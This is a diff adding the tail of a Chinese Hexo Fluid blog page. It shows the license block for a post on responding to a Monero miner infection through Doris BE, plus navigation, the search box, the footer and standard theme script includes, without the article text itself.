+      <div>一次门罗币挖矿病毒应急排查：从 Doris BE update_config 进来的矿工</div>
+      <div>https://piupiuxiupa.github.io/2026/10/22/doris-miner-incident/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>piupiuxiupa</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年10月22日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/06/23/redis-basic/" title="Redis 基础入门">
+                        <span class="hidden-mobile">Redis 基础入门</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://piupiuxiupa.github.io/" target="_blank" rel="nofollow noopener"><span>piupiuxiupa</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
